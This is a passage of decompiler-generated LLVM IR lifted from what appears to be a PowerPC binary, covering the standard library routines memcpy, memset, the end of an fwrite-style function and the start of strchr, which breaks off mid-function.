  %v5_10009e74 = call i32 @__stdio_fwrite(i32 %v0_10009e5c, i32 %v2_10009e70, i16* %v1_10009e80)
  %v1_10009e78 = load i32, i32* @r29, align 4
  %v2_10009e78 = udiv i32 %v5_10009e74, %v1_10009e78
  store i32 %v2_10009e78, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009ea4

dec_label_pc_10009e80:                            ; preds = %dec_label_pc_10009e58
  %v2_10009e80 = load i16, i16* %v1_10009e80, align 2
  %v1_10009e84 = or i16 %v2_10009e80, 8
  store i16 %v1_10009e84, i16* %v1_10009e80, align 2
  %v0_10009e8c = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10009e98 = inttoptr i32 %v0_10009e8c to i32*
  store i32 22, i32* %v2_10009e98, align 4
  %v0_10009ea8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009ea4

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009e48, %dec_label_pc_10009e3c
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009ea4

dec_label_pc_10009ea4:                            ; preds = %dec_label_pc_10009e80, %dec_label_pc_10009e70, %dec_label_pc_10009ea0
  %v0_10009ea8 = phi i32 [ %v0_10009ea8.pre, %dec_label_pc_10009e80 ], [ %v2_10009e78, %dec_label_pc_10009e70 ], [ 0, %dec_label_pc_10009ea0 ]
  ret i32 %v0_10009ea8

; uselistorder directives
  uselistorder i16* %v1_10009e80, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i32 ()* @__stdio_trans2w_o, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009ea4, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10009ebc = load i32, i32* @r5, align 4
  %v1_10009ebc = call i32 @__asm_rlwinm.(i32 %v0_10009ebc, i32 29, i32 3, i32 31)
  store i32 %v1_10009ebc, i32* %r9.global-to-local, align 4
  %v4_10009ebc = icmp eq i32 %v1_10009ebc, 0
  %v0_10009ec0 = load i32, i32* @r4, align 4
  %v1_10009ec0 = add i32 %v0_10009ec0, -4
  store i32 %v1_10009ec0, i32* %r4.global-to-local, align 4
  %v0_10009ec4 = load i32, i32* @r3, align 4
  %v1_10009ec4 = add i32 %v0_10009ec4, -4
  store i32 %v1_10009ec4, i32* %r11.global-to-local, align 4
  br i1 %v4_10009ebc, label %dec_label_pc_10009eec, label %dec_label_pc_10009ecc

dec_label_pc_10009ecc:                            ; preds = %entry
  %v1_10009ecc = urem i32 %v1_10009ec4, 4
  %v3_10009ecc = icmp eq i32 %v1_10009ecc, 0
  br i1 %v3_10009ecc, label %dec_label_pc_10009ed4, label %dec_label_pc_10009f28

dec_label_pc_10009ed4:                            ; preds = %dec_label_pc_10009f48.dec_label_pc_10009ed4_crit_edge, %dec_label_pc_10009ecc
  %v1_10009ee0.pre = phi i32 [ %v1_10009ec4, %dec_label_pc_10009ecc ], [ %v1_10009ee0.pre.pre, %dec_label_pc_10009f48.dec_label_pc_10009ed4_crit_edge ]
  %v0_10009ed4 = phi i32 [ %v1_10009ebc, %dec_label_pc_10009ecc ], [ %v1_10009f48, %dec_label_pc_10009f48.dec_label_pc_10009ed4_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10009ecc ], [ %v2_10009f30, %dec_label_pc_10009f48.dec_label_pc_10009ed4_crit_edge ]
  store i32 %v0_10009ed4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009ed8

dec_label_pc_10009ed8:                            ; preds = %dec_label_pc_10009ed8, %dec_label_pc_10009ed4
  %v1_10009ee0 = phi i32 [ %v2_10009ee4, %dec_label_pc_10009ed8 ], [ %v1_10009ee0.pre, %dec_label_pc_10009ed4 ]
  %v0_10009ed8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009ed8 = add i32 %v0_10009ed8, 4
  %v2_10009ed8 = inttoptr i32 %v1_10009ed8 to i32*
  %v3_10009ed8 = load i32, i32* %v2_10009ed8, align 4
  %v1_10009edc = add i32 %v0_10009ed8, 8
  %v2_10009edc = inttoptr i32 %v1_10009edc to i32*
  %v3_10009edc = load i32, i32* %v2_10009edc, align 4
  store i32 %v3_10009edc, i32* %r9.global-to-local, align 4
  store i32 %v1_10009edc, i32* %r4.global-to-local, align 4
  %v2_10009ee0 = add i32 %v1_10009ee0, 4
  %v3_10009ee0 = inttoptr i32 %v2_10009ee0 to i32*
  store i32 %v3_10009ed8, i32* %v3_10009ee0, align 4
  %v0_10009ee4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009ee4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009ee4 = add i32 %v1_10009ee4, 8
  %v3_10009ee4 = inttoptr i32 %v2_10009ee4 to i32*
  store i32 %v0_10009ee4, i32* %v3_10009ee4, align 4
  store i32 %v2_10009ee4, i32* %r11.global-to-local, align 4
  %v0_10009ee8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009ee8 = add i32 %v0_10009ee8, -1
  store i32 %v1_10009ee8, i32* %ctr.global-to-local, align 4
  %v2_10009ee8 = icmp eq i32 %v1_10009ee8, 0
  br i1 %v2_10009ee8, label %dec_label_pc_10009eec, label %dec_label_pc_10009ed8

dec_label_pc_10009eec:                            ; preds = %dec_label_pc_10009ed8, %dec_label_pc_10009f48, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_10009f30, %dec_label_pc_10009f48 ], [ %.0, %dec_label_pc_10009ed8 ]
  %v1_10009eec = urem i32 %.1, 8
  store i32 %v1_10009eec, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009eec, 4
  br i1 %tmp, label %dec_label_pc_10009f04, label %dec_label_pc_10009ef8

dec_label_pc_10009ef8:                            ; preds = %dec_label_pc_10009eec
  %v0_10009ef8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009ef8 = add i32 %v0_10009ef8, 4
  %v2_10009ef8 = inttoptr i32 %v1_10009ef8 to i32*
  %v3_10009ef8 = load i32, i32* %v2_10009ef8, align 4
  store i32 %v1_10009ef8, i32* %r4.global-to-local, align 4
  %v1_10009efc = add nsw i32 %v1_10009eec, -4
  store i32 %v1_10009efc, i32* @r5, align 4
  %v1_10009f00 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009f00 = add i32 %v1_10009f00, 4
  %v3_10009f00 = inttoptr i32 %v2_10009f00 to i32*
  store i32 %v3_10009ef8, i32* %v3_10009f00, align 4
  store i32 %v2_10009f00, i32* %r11.global-to-local, align 4
  %v0_10009f04.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009f04

dec_label_pc_10009f04:                            ; preds = %dec_label_pc_10009eec, %dec_label_pc_10009ef8
  %v0_10009f04 = phi i32 [ %v1_10009eec, %dec_label_pc_10009eec ], [ %v0_10009f04.pre, %dec_label_pc_10009ef8 ]
  %v3_10009f04 = icmp eq i32 %v0_10009f04, 0
  %v0_10009f08 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009f04, i32 %v0_10009f08)
  %v0_10009f0c = load i32, i32* @r5, align 4
  store i32 %v0_10009f0c, i32* %ctr.global-to-local, align 4
  %v0_10009f10 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009f10 = add i32 %v0_10009f10, 3
  store i32 %v1_10009f10, i32* %r4.global-to-local, align 4
  %v0_10009f14 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009f14 = add i32 %v0_10009f14, 3
  store i32 %v1_10009f14, i32* %r9.global-to-local, align 4
  %v1_10009f189 = add i32 %v0_10009f10, 4
  %v2_10009f1810 = inttoptr i32 %v1_10009f189 to i8*
  %v3_10009f1811 = load i8, i8* %v2_10009f1810, align 1
  store i32 %v1_10009f189, i32* %r4.global-to-local, align 4
  %v3_10009f1c13 = add i32 %v0_10009f14, 4
  %v4_10009f1c14 = inttoptr i32 %v3_10009f1c13 to i8*
  store i8 %v3_10009f1811, i8* %v4_10009f1c14, align 1
  store i32 %v3_10009f1c13, i32* %r9.global-to-local, align 4
  %v0_10009f2015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009f2016 = add i32 %v0_10009f2015, -1
  store i32 %v1_10009f2016, i32* %ctr.global-to-local, align 4
  %v2_10009f2017 = icmp eq i32 %v1_10009f2016, 0
  br i1 %v2_10009f2017, label %dec_label_pc_10009f54, label %dec_label_pc_10009f18.dec_label_pc_10009f18_crit_edge

dec_label_pc_10009f18.dec_label_pc_10009f18_crit_edge: ; preds = %dec_label_pc_10009f04, %dec_label_pc_10009f18.dec_label_pc_10009f18_crit_edge
  %v3_10009f1c18 = phi i32 [ %v3_10009f1c, %dec_label_pc_10009f18.dec_label_pc_10009f18_crit_edge ], [ %v3_10009f1c13, %dec_label_pc_10009f04 ]
  %v0_10009f18.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10009f18 = add i32 %v0_10009f18.pre, 1
  %v2_10009f18 = inttoptr i32 %v1_10009f18 to i8*
  %v3_10009f18 = load i8, i8* %v2_10009f18, align 1
  store i32 %v1_10009f18, i32* %r4.global-to-local, align 4
  %v3_10009f1c = add i32 %v3_10009f1c18, 1
  %v4_10009f1c = inttoptr i32 %v3_10009f1c to i8*
  store i8 %v3_10009f18, i8* %v4_10009f1c, align 1
  store i32 %v3_10009f1c, i32* %r9.global-to-local, align 4
  %v0_10009f20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009f20 = add i32 %v0_10009f20, -1
  store i32 %v1_10009f20, i32* %ctr.global-to-local, align 4
  %v2_10009f20 = icmp eq i32 %v1_10009f20, 0
  br i1 %v2_10009f20, label %dec_label_pc_10009f54, label %dec_label_pc_10009f18.dec_label_pc_10009f18_crit_edge

dec_label_pc_10009f28:                            ; preds = %dec_label_pc_10009ecc
  %v1_10009f28 = sub nsw i32 4, %v1_10009ecc
  store i32 %v1_10009f28, i32* %ctr.global-to-local, align 4
  %v1_10009f30 = load i32, i32* @r5, align 4
  %v2_10009f30 = sub i32 %v1_10009f30, %v1_10009f28
  br label %dec_label_pc_10009f34

dec_label_pc_10009f34:                            ; preds = %dec_label_pc_10009f34.dec_label_pc_10009f34_crit_edge, %dec_label_pc_10009f28
  %v2_10009f3c = phi i32 [ %v1_10009f40, %dec_label_pc_10009f34.dec_label_pc_10009f34_crit_edge ], [ %v1_10009ec4, %dec_label_pc_10009f28 ]
  %v0_10009f34 = phi i32 [ %v0_10009f34.pre, %dec_label_pc_10009f34.dec_label_pc_10009f34_crit_edge ], [ %v1_10009ec0, %dec_label_pc_10009f28 ]
  %v1_10009f34 = add i32 %v0_10009f34, 4
  %v2_10009f34 = inttoptr i32 %v1_10009f34 to i8*
  %v3_10009f34 = load i8, i8* %v2_10009f34, align 1
  %v1_10009f38 = add i32 %v0_10009f34, 1
  store i32 %v1_10009f38, i32* %r4.global-to-local, align 4
  %v3_10009f3c = add i32 %v2_10009f3c, 4
  %v4_10009f3c = inttoptr i32 %v3_10009f3c to i8*
  store i8 %v3_10009f34, i8* %v4_10009f3c, align 1
  %v0_10009f40 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009f40 = add i32 %v0_10009f40, 1
  store i32 %v1_10009f40, i32* %r11.global-to-local, align 4
  %v0_10009f44 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009f44 = add i32 %v0_10009f44, -1
  store i32 %v1_10009f44, i32* %ctr.global-to-local, align 4
  %v2_10009f44 = icmp eq i32 %v1_10009f44, 0
  br i1 %v2_10009f44, label %dec_label_pc_10009f48, label %dec_label_pc_10009f34.dec_label_pc_10009f34_crit_edge

dec_label_pc_10009f34.dec_label_pc_10009f34_crit_edge: ; preds = %dec_label_pc_10009f34
  %v0_10009f34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009f34

dec_label_pc_10009f48:                            ; preds = %dec_label_pc_10009f34
  %v1_10009f48 = call i32 @__asm_rlwinm.(i32 %v2_10009f30, i32 29, i32 3, i32 31)
  store i32 %v1_10009f48, i32* %r9.global-to-local, align 4
  %v4_10009f48 = icmp eq i32 %v1_10009f48, 0
  br i1 %v4_10009f48, label %dec_label_pc_10009eec, label %dec_label_pc_10009f48.dec_label_pc_10009ed4_crit_edge

dec_label_pc_10009f48.dec_label_pc_10009ed4_crit_edge: ; preds = %dec_label_pc_10009f48
  %v1_10009ee0.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009ed4

dec_label_pc_10009f54:                            ; preds = %dec_label_pc_10009f18.dec_label_pc_10009f18_crit_edge, %dec_label_pc_10009f04
  %v0_10009f54 = load i32, i32* @r3, align 4
  ret i32 %v0_10009f54

; uselistorder directives
  uselistorder i32 %v1_10009f48, { 1, 2, 0 }
  uselistorder i32 %v1_10009f44, { 1, 0 }
  uselistorder i32 %v1_10009f40, { 1, 0 }
  uselistorder i32 %v0_10009f34, { 1, 0 }
  uselistorder i32 %v2_10009f30, { 2, 1, 0 }
  uselistorder i32 %v1_10009f20, { 1, 0 }
  uselistorder i32 %v3_10009f1c, { 1, 2, 0 }
  uselistorder i32 %v1_10009eec, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10009ee8, { 1, 0 }
  uselistorder i32 %v2_10009ee4, { 1, 2, 0 }
  uselistorder i32 %v1_10009ecc, { 1, 0 }
  uselistorder i32 %v1_10009ec4, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009f18.dec_label_pc_10009f18_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009f04, { 1, 0 }
  uselistorder label %dec_label_pc_10009eec, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10009f58 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10009f58, i32* %r9.global-to-local, align 4
  %v4_10009f58 = icmp eq i32 %v1_10009f58, 0
  store i1 %v4_10009f58, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_10009f60 = add i32 %arg1, -4
  store i32 %v1_10009f60, i32* %r11.global-to-local, align 4
  %v1_10009f64 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10009f68 = call i32 @__asm_rlwimi(i32 %v1_10009f64, i32 16, i32 0, i32 15)
  %v2_10009f68 = trunc i32 %v1_10009f68 to i8
  %v0_10009f6c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009f6c, label %dec_label_pc_10009f90, label %dec_label_pc_10009f70

dec_label_pc_10009f70:                            ; preds = %entry
  %v0_10009f70 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009f70 = urem i32 %v0_10009f70, 4
  %v3_10009f70 = icmp eq i32 %v1_10009f70, 0
  store i1 %v3_10009f70, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10009f70, label %dec_label_pc_10009f70.dec_label_pc_10009f78_crit_edge, label %dec_label_pc_10009fc0

dec_label_pc_10009f70.dec_label_pc_10009f78_crit_edge: ; preds = %dec_label_pc_10009f70
  %v0_10009f78.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f78

dec_label_pc_10009f78:                            ; preds = %dec_label_pc_10009fd8.dec_label_pc_10009f78_crit_edge, %dec_label_pc_10009f70.dec_label_pc_10009f78_crit_edge
  %v0_10009f7c.pre = phi i32 [ %v0_10009f70, %dec_label_pc_10009f70.dec_label_pc_10009f78_crit_edge ], [ %v0_10009f7c.pre.pre, %dec_label_pc_10009fd8.dec_label_pc_10009f78_crit_edge ]
  %v0_10009f78 = phi i32 [ %v0_10009f78.pre, %dec_label_pc_10009f70.dec_label_pc_10009f78_crit_edge ], [ %v1_10009fd8, %dec_label_pc_10009fd8.dec_label_pc_10009f78_crit_edge ]
  store i32 %v0_10009f78, i32* %ctr.global-to-local, align 4
  %v1_10009f80 = sext i8 %v2_10009f68 to i32
  br label %dec_label_pc_10009f7c

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009f7c, %dec_label_pc_10009f78
  %v0_10009f7c = phi i32 [ %v1_10009f88, %dec_label_pc_10009f7c ], [ %v0_10009f7c.pre, %dec_label_pc_10009f78 ]
  %v1_10009f7c = add i32 %v0_10009f7c, 4
  store i32 %v1_10009f7c, i32* %r9.global-to-local, align 4
  %v4_10009f80 = inttoptr i32 %v1_10009f7c to i32*
  store i32 %v1_10009f80, i32* %v4_10009f80, align 4
  %v2_10009f84 = load i32, i32* %r9.global-to-local, align 4
  %v3_10009f84 = add i32 %v2_10009f84, 4
  %v4_10009f84 = inttoptr i32 %v3_10009f84 to i32*
  store i32 %v1_10009f80, i32* %v4_10009f84, align 4
  %v0_10009f88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f88 = add i32 %v0_10009f88, 4
  store i32 %v1_10009f88, i32* %r11.global-to-local, align 4
  %v0_10009f8c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009f8c = add i32 %v0_10009f8c, -1
  store i32 %v1_10009f8c, i32* %ctr.global-to-local, align 4
  %v2_10009f8c = icmp eq i32 %v1_10009f8c, 0
  br i1 %v2_10009f8c, label %dec_label_pc_10009f90, label %dec_label_pc_10009f7c

dec_label_pc_10009f90:                            ; preds = %dec_label_pc_10009f7c, %dec_label_pc_10009fd8, %entry
  %v0_10009f90 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009f90 = urem i32 %v0_10009f90, 8
  store i32 %v1_10009f90, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009f90, 4
  br i1 %tmp, label %dec_label_pc_10009fa4, label %dec_label_pc_10009f9c

dec_label_pc_10009f9c:                            ; preds = %dec_label_pc_10009f90
  %v1_10009f9c = sext i8 %v2_10009f68 to i32
  %v2_10009f9c = load i32, i32* %r11.global-to-local, align 4
  %v3_10009f9c = add i32 %v2_10009f9c, 4
  %v4_10009f9c = inttoptr i32 %v3_10009f9c to i32*
  store i32 %v1_10009f9c, i32* %v4_10009f9c, align 4
  store i32 %v3_10009f9c, i32* %r11.global-to-local, align 4
  %v0_10009fa0 = load i32, i32* @r5, align 4
  %v1_10009fa0 = add i32 %v0_10009fa0, -4
  store i32 %v1_10009fa0, i32* @r5, align 4
  br label %dec_label_pc_10009fa4

dec_label_pc_10009fa4:                            ; preds = %dec_label_pc_10009f90, %dec_label_pc_10009f9c
  %v0_10009fa4 = phi i32 [ %v1_10009f90, %dec_label_pc_10009f90 ], [ %v1_10009fa0, %dec_label_pc_10009f9c ]
  %v3_10009fa4 = icmp eq i32 %v0_10009fa4, 0
  %v0_10009fa8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009fa4, i32 %v0_10009fa8)
  %v0_10009fac = load i32, i32* @r5, align 4
  store i32 %v0_10009fac, i32* %ctr.global-to-local, align 4
  %v0_10009fb0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009fb0 = add i32 %v0_10009fb0, 3
  store i32 %v1_10009fb0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009fb4

dec_label_pc_10009fb4:                            ; preds = %dec_label_pc_10009fb4, %dec_label_pc_10009fa4
  %v3_10009fb4 = phi i32 [ %v4_10009fb4, %dec_label_pc_10009fb4 ], [ %v1_10009fb0, %dec_label_pc_10009fa4 ]
  %v4_10009fb4 = add i32 %v3_10009fb4, 1
  %v5_10009fb4 = inttoptr i32 %v4_10009fb4 to i8*
  store i8 %v2_10009f68, i8* %v5_10009fb4, align 1
  store i32 %v4_10009fb4, i32* %r9.global-to-local, align 4
  %v0_10009fb8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009fb8 = add i32 %v0_10009fb8, -1
  store i32 %v1_10009fb8, i32* %ctr.global-to-local, align 4
  %v2_10009fb8 = icmp eq i32 %v1_10009fb8, 0
  br i1 %v2_10009fb8, label %dec_label_pc_10009fe4, label %dec_label_pc_10009fb4

dec_label_pc_10009fc0:                            ; preds = %dec_label_pc_10009f70
  %v1_10009fc0 = sub nsw i32 4, %v1_10009f70
  store i32 %v1_10009fc0, i32* %ctr.global-to-local, align 4
  %v1_10009fc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009fc8 = sub i32 %v1_10009fc8, %v1_10009fc0
  store i32 %v2_10009fc8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009fcc

dec_label_pc_10009fcc:                            ; preds = %dec_label_pc_10009fcc, %dec_label_pc_10009fc0
  %v3_10009fcc = phi i32 [ %v1_10009fd0, %dec_label_pc_10009fcc ], [ %v0_10009f70, %dec_label_pc_10009fc0 ]
  %v4_10009fcc = add i32 %v3_10009fcc, 4
  %v5_10009fcc = inttoptr i32 %v4_10009fcc to i8*
  store i8 %v2_10009f68, i8* %v5_10009fcc, align 1
  %v0_10009fd0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009fd0 = add i32 %v0_10009fd0, 1
  store i32 %v1_10009fd0, i32* %r11.global-to-local, align 4
  %v0_10009fd4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009fd4 = add i32 %v0_10009fd4, -1
  store i32 %v1_10009fd4, i32* %ctr.global-to-local, align 4
  %v2_10009fd4 = icmp eq i32 %v1_10009fd4, 0
  br i1 %v2_10009fd4, label %dec_label_pc_10009fd8, label %dec_label_pc_10009fcc

dec_label_pc_10009fd8:                            ; preds = %dec_label_pc_10009fcc
  %v0_10009fd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009fd8 = call i32 @__asm_rlwinm.(i32 %v0_10009fd8, i32 29, i32 3, i32 31)
  store i32 %v1_10009fd8, i32* %r9.global-to-local, align 4
  %v4_10009fd8 = icmp eq i32 %v1_10009fd8, 0
  store i1 %v4_10009fd8, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_10009fd8, label %dec_label_pc_10009f90, label %dec_label_pc_10009fd8.dec_label_pc_10009f78_crit_edge

dec_label_pc_10009fd8.dec_label_pc_10009f78_crit_edge: ; preds = %dec_label_pc_10009fd8
  %v0_10009f7c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009f78

dec_label_pc_10009fe4:                            ; preds = %dec_label_pc_10009fb4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10009fd8, { 1, 2, 0 }
  uselistorder i32 %v1_10009fd4, { 1, 0 }
  uselistorder i32 %v1_10009fd0, { 1, 0 }
  uselistorder i32 %v1_10009fb8, { 1, 0 }
  uselistorder i32 %v4_10009fb4, { 1, 2, 0 }
  uselistorder i32 %v1_10009f90, { 2, 1, 0 }
  uselistorder i32 %v1_10009f8c, { 1, 0 }
  uselistorder i32 %v1_10009f88, { 1, 0 }
  uselistorder i32 %v1_10009f70, { 1, 0 }
  uselistorder i32 %v0_10009f70, { 2, 1, 0 }
  uselistorder i8 %v2_10009f68, { 2, 1, 0, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder i1* @cr0_so, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10009fa4, { 1, 0 }
  uselistorder label %dec_label_pc_10009f90, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10009fe8 = urem i32 %arg1, 256
  store i32 %v1_10009fe8, i32* %r4.global-to-local, align 4
  %v0_1000a0082 = load i32, i32* @r3, align 4
  %v1_1000a0083 = urem i32 %v0_1000a0082, 4
  %v3_1000a0085 = icmp eq i32 %v1_1000a0083, 0
  br i1 %v3_1000a0085, label %dec_label_pc_1000a010, label %dec_label_pc_10009ff0

dec_label_pc_10009ff0:                            ; preds = %entry, %dec_label_pc_1000a004
  %v1_10009ff4 = phi i32 [ %v0_1000a010.pre, %dec_label_pc_1000a004 ], [ %v1_10009fe8, %entry ]
  %v0_10009ff0 = phi i32 [ %v1_1000a004, %dec_label_pc_1000a004 ], [ %v0_1000a0082, %entry ]
  %v1_10009ff0 = inttoptr i32 %v0_10009ff0 to i8*
  %v2_10009ff0 = load i8, i8* %v1_10009ff0, align 1
  %v3_10009ff0 = zext i8 %v2_10009ff0 to i32
  %v4_10009ff4 = icmp eq i32 %v3_10009ff0, %v1_10009ff4
  %v3_10009ff8 = icmp eq i8 %v2_10009ff0, 0
  %v0_10009ffc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10009ff4, i32 %v0_10009ffc)
  br i1 %v3_10009ff8, label %dec_label_pc_1000a0e0, label %dec_label_pc_1000a004

dec_label_pc_1000a004:                            ; preds = %dec_label_pc_10009ff0
  %v0_1000a004 = load i32, i32* @r3, align 4
  %v1_1000a004 = add i32 %v0_1000a004, 1
  store i32 %v1_1000a004, i32* @r3, align 4
  %v1_1000a008 = urem i32 %v1_1000a004, 4
  %v3_1000a008 = icmp eq i32 %v1_1000a008, 0
  %v0_1000a010.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000a008, label %dec_label_pc_1000a010, label %dec_label_pc_10009ff0

dec_label_pc_1000a010:                            ; preds = %dec_label_pc_1000a004, %entry
  %v0_1000a02810 = phi i32 [ %v0_1000a0082, %entry ], [ %v1_1000a004, %dec_label_pc_1000a004 ]
  %v0_1000a010 = phi i32 [ %v1_10009fe8, %entry ], [ %v0_1000a010.pre, %dec_label_pc_1000a004 ]
  %v1_1000a010 = mul i32 %v0_1000a010, 256
  %v2_1000a018 = or i32 %v1_1000a010, %v0_1000a010
  %v1_1000a020 = mul i32 %v2_1000a018, 65536
  %v2_1000a024 = or i32 %v1_1000a020, %v2_1000a018
  br label %dec_label_pc_1000a028

dec_label_pc_1000a028:                            ; preds = %dec_label_pc_1000a028, %dec_label_pc_1000a0dc, %dec_label_pc_1000a010
  %v0_1000a080 = phi i32 [ %v0_1000a02810, %dec_label_pc_1000a010 ], [ %v1_1000a02c, %dec_label_pc_1000a0dc ], [ %v1_1000a02c, %dec_label_pc_1000a028 ]
  %v1_1000a028 = inttoptr i32 %v0_1000a080 to i32*
  %v2_1000a028 = load i32, i32* %v1_1000a028, align 4
  %v1_1000a02c = add i32 %v0_1000a080, 4
  %v2_1000a034 = xor i32 %v2_1000a028, %v2_1000a024
  %v1_1000a038 = add i32 %v2_1000a028, 2130640639
  %v2_1000a040 = xor i32 %v1_1000a038, %v2_1000a028
  %v1_1000a044 = add i32 %v2_1000a034, 2130640639
  %v2_1000a048 = and i32 %v2_1000a040, -2130640640
  %v3_1000a048 = xor i32 %v2_1000a048, -2130640640
  %v2_1000a04c = xor i32 %v1_1000a044, %v2_1000a034
  %v2_1000a050 = and i32 %v2_1000a04c, -2130640640
  %v3_1000a050 = xor i32 %v2_1000a050, -2130640640
  %v1_1000a05c = add i32 %v0_1000a080, 1
  %tmp = or i32 %v3_1000a050, %v3_1000a048
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000a028, label %dec_label_pc_1000a068

dec_label_pc_1000a068:                            ; preds = %dec_label_pc_1000a028
  %v2_1000a068 = inttoptr i32 %v0_1000a080 to i8*
  %v3_1000a068 = load i8, i8* %v2_1000a068, align 1
  %v4_1000a068 = zext i8 %v3_1000a068 to i32
  %v1_1000a06c = add i32 %v0_1000a080, 2
  %v1_1000a070 = add i32 %v0_1000a080, 3
  %v4_1000a074 = icmp eq i32 %v4_1000a068, %v0_1000a010
  br i1 %v4_1000a074, label %dec_label_pc_1000a080, label %dec_label_pc_1000a088

dec_label_pc_1000a080:                            ; preds = %dec_label_pc_1000a068
  ret i32 %v0_1000a080

dec_label_pc_1000a088:                            ; preds = %dec_label_pc_1000a068
  %v3_1000a078 = icmp eq i8 %v3_1000a068, 0
  br i1 %v3_1000a078, label %dec_label_pc_1000a0e0, label %dec_label_pc_1000a08c

dec_label_pc_1000a08c:                            ; preds = %dec_label_pc_1000a088
  %v2_1000a08c = inttoptr i32 %v1_1000a05c to i8*
  %v3_1000a08c = load i8, i8* %v2_1000a08c, align 1
  %v4_1000a08c = zext i8 %v3_1000a08c to i32
  %v4_1000a090 = icmp eq i32 %v4_1000a08c, %v0_1000a010
  br i1 %v4_1000a090, label %dec_label_pc_1000a09c, label %dec_label_pc_1000a0a4

dec_label_pc_1000a09c:                            ; preds = %dec_label_pc_1000a08c
  ret i32 %v1_1000a05c

dec_label_pc_1000a0a4:                            ; preds = %dec_label_pc_1000a08c
